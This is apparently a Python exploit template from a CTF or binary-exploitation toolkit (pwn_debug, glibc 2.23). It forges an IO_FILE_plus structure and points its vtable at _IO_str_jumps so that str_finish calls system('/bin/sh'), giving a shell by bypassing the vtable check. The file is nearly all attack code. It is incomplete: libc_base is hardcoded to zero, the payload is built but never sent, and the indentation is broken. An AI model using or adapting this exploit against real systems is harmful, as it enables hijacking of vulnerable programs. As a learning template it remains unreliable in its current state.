# File: IO_FILE_str_finish_vtable_bypass.py
# Author: raycp
# Date: 2019-06-01
# Description: template for bypass vtable check with str_jumps vtable

from pwn_debug import *


pdbg=pwn_debug("./binary")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.23")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc


def pwn():

	#pdbg.bp([])

    libc_base=0x0

    io_list_all=libc_base+libc.symbols['_IO_list_all']
    io_str_jumps=libc_base+libc.symbols['_IO_str_jumps']
    binsh_addr=libc_base+next(libc.search("/bin/sh"))
    system_addr=libc_base+libc.symbols['system']
    log.info("leaking libc base: %s"%hex(libc_base))

	fake_file=IO_FILE_plus()
    fake_file._IO_read_ptr=0x61
    fake_file._IO_read_base=io_list_all-0x10
    fake_file._IO_buf_base=binsh_addr
    fake_file._IO_write_ptr=1
    fake_file.vtable=io_str_jumps-8

    fake_file.show()
    fake_file.str_finish_check()
    file_data=str(fake_file)+p64(system_addr)*2
   
    # hajack to execute system(binsh)
    
    p.interactive() 

if __name__ == '__main__':
    pwn()


